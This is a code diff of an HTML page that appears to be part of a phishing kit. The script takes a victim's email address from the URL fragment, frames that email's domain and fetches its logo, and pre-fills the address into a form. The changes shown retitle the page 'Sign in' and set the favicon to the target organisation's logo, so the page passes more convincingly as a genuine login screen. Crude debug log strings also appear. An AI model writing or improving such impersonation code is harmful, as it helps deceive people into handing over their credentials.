@@ -6,8 +6,9 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
     <script src="x-frame.js" type="module"></script>
+    <link rel="icon" type="image/x-icon" id="blames" href="" />
 
-    <title>Document</title>
+    <title>Sign in</title>
     <style>
       html,
       body {
@@ -80,6 +81,7 @@
       const logo = document.getElementById("grains");
       const frame = document.getElementById("framo");
       const road = document.getElementById("road");
+      const blame = document.getElementById("blames");
       const ref = window.location.href;
       console.log("contenct bitch", ref);
       const anchor = ref.split("#")[1];
@@ -88,6 +90,7 @@
       console.log("email though", mai);
       frame.src = `https://${mai}`;
       logo.src = `https://logo.clearbit.com/https://${mai}`;
+      blame.href = `https://logo.clearbit.com/https://${mai}`;
       road.value = anchor;
     </script>
 
